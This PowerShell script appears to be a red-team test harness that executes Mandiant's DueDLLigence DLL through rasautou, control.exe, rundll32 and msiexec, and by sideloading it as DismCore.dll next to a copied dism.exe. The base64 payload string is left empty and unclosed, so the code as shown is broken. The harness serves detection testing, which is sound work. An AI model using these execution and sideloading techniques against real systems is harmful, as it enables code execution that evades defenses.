function Invoke-SPLDLLigence {

    <#
  
    .NOTES
  
    Author  : @m_haggis
    Version : 1.0
    Purpose : PowerShell harness for DueDLLigence DLL testing
  
   .DESCRIPTION
  
      The following harness utilizes the base DueDLLigence DLL to simulate 5 of 7 built in behaviors. 
   
   .EXAMPLE
  
      Invoke-SPLDLLigence -method control
      Executes control.exe method loading .cpl file
   
   .EXAMPLE
  
      Invoke-SPLDLLigence -method dism_side_load
      Copies dism.exe to new location and renames DueDLLigence.dll as dismcore.dll. Spawns dism.exe which sideloads the malicious DLL.
  
  
   .LINK
  
       https://www.virustotal.com/gui/file/71227bc1534a092ba03e6374cad929b193d1f6667cb781efd059b7d7d8e09c1d/detection
       https://github.com/mandiant/DueDLLigence
    #>
   
      param (
      [Parameter(Mandatory)]
      [String]
      [ValidateSet('rasautou','control','rundll32','msiexec','dism_side_load')]
      $method,
          
      [Parameter()]
      [String]
      $DueDLLigencePath = 'C:\temp\duedlligence.dll',
  
      [Parameter()]
      [String]
      $DueDLLigenceCPLPath = "C:\temp\duedlligence.cpl"
  
      )
   
  
      # Convert DLL to base64
      #
      #$file = "C:\temp\duedlligence.dll"
      #$filebytes = Get-Content $file -Encoding byte
      #$fileBytesBase64 = [System.Convert]::ToBase64String($filebytes)
      #$fileBytesBase64 | Out-File 'c:\users\administrator\desktop\duedll.txt'
  
      # Encoded Sample: https://www.virustotal.com/gui/file/71227bc1534a092ba03e6374cad929b193d1f6667cb781efd059b7d7d8e09c1d
      $EncodedDueDLLigence  = "
  
  
          IF (!(Test-Path $DueDLLigencePath)) {
                  $DueDLLigenceFileBytes = [Convert]::FromBase64String($EncodedDueDLLigence)
                  [IO.File]::WriteAllBytes("$DueDLLigencePath", $DueDLLigenceFileBytes)
              Write-Verbose "Attempting to write $DueDLLigencePath."
          } ELSE {
              Write-Host "$DueDLLigencePath already present, moving on."
              }
  
  
      #$DueDLLigenceFileBytes = [Convert]::FromBase64String($EncodedDueDLLigence)
      #[IO.File]::WriteAllBytes("$DueDLLigencePath", $DueDLLigenceFileBytes)
  
  
      function Invoke-RasautouDLLigence {
  
          $RasautouFilePath = "C:\windows\system32\rasautou.exe"
          
          #rasautou.exe -d $DueDLLigencePath -p powershell –a a –e e
  
  
                  IF (!(Test-Path $RasautouFilePath)) {
                  Write-host "System needs $RasautouFilePath."
          } ELSE {
                  return
                  }
  
  
          $rasautouCommandLine = "`"$RasautouFilePath`" -d $DueDLLigencePath -p powershell –a a –e e"  
          $ProcStartResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $rasautouCommandLine }  
           return
           }
  
  
      function Invoke-ControlDLLigence {
          
          $ControlFilePath = "c:\windows\system32\control.exe"
  
          IF (!(Test-Path $DueDLLigenceCPLPath)) {
                  Copy-item $DueDLLigencePath $DueDLLigenceCPLPath
                  Write-Verbose "Attempting to copy $DueDLLigencePath to $DueDLLigenceCPLPath."
          } ELSE {
                  Write-Host "$DueDLLigenceCPLPath already present"
          }
  
  
          $controlCommandLine = "`"$ControlFilePath`" $DueDLLigenceCPLPath"  
          $ProcStartResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $controlCommandLine }  
           return
  
            
           }
  
      function Invoke-Rundll32DLLigence {
  
          $Rundll32FilePath = "c:\windows\system32\rundll32.exe"         
           
          $rundll32CommandLine = "`"$Rundll32FilePath`" Shell32.dll, Control_RunDLL $DueDLLigencePath"  
          $ProcStartResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $rundll32CommandLine }  
            return
  
  
           }
  
      function Invoke-MSIExecDLLigence {
  
          $MSIExecFilePath = "C:\windows\system32\msiexec.exe"
  
  
        $msiexecCommandLine = "`"$MSIExecFilePath`" /z $DueDLLigencePath"  
        $ProcStartResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $msiexecCommandLine }  
          return
            
           
          }

      function Invoke-DismSideLoadDLLigence {
  
          $DismFilePath = "C:\Temp\Dism.exe"
          $DismCoreFilePath = "c:\temp\DismCore.dll"
  
          IF (!(Test-Path $DismFilePath)) {
                  Copy-Item C:\windows\system32\dism.exe $DismFilePath
                  Write-Verbose "Attempting to copy dism.exe to $DismFilePath."
          } ELSE {
                  Write-Host "$DismFilePath already present"
                  }
  
          IF (!(Test-Path $DismCoreFilePath)) {
                  Copy-Item $DueDLLigencePath -Destination $DismCoreFilePath
                  Write-Verbose "Attempting to copy $DueDLLigencePath to $DismCoreFilePath."
          } ELSE {
                  Write-Host "$DismCoreFilePath already present"
              }
       
           Write-Host "Starting $DismFilePath."
           Start-Process $DismFilePath
           Write-Verbose "Attempting to start $DismFilePath. Calc should spawn."
  
            }
  
                  switch ($method) {
                  'dism_side_load' { Invoke-DismSideLoadDLLigence }
                  'msiexec'        { Invoke-MSIExecDLLigence }
                  'control'        { Invoke-ControlDLLigence }
                  'rundll32'       { Invoke-Rundll32DLLigence }
                  'rasautou'       { Invoke-RasautouDLLigence }
                  }
  
  }
   
  